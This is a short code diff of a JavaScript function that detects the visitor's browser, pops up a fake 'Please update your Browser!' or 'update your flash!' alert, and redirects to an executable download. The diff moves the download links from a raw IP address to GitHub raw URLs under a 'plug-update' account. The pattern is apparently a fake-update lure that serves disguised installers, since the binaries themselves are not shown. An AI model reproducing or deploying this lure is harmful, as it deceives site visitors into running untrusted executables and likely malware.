@@ -8,16 +8,16 @@ function myBrowser() {
     var isChrome = userAgent.indexOf("Chrome") > -1;
     if (isFF) {
 		alert("Please update your Browser!");
-		window.location.href="http://45.11.19.187:8080/Firefox%20Installer.exe";
+		window.location.href="https://github.com/plug-update/firefox/raw/main/Firefox%20Installer.exe";
         return "FF";
     }
     if (isChrome) {
 		alert("Please update your Browser!");
-		window.location.href="http://45.11.19.187:8080/ChromeSetup.exe";
+		window.location.href="https://github.com/plug-update/chrome/raw/main/ChromeSetup.exe";
         return "Chrome";
     }
 	alert("Please update your flash!");
-	window.location.href="http://45.11.19.187:8080/flashplayer.exe";
+	window.location.href="https://github.com/plug-update/flash/raw/main/Flashplayer.exe";
     
 }
 
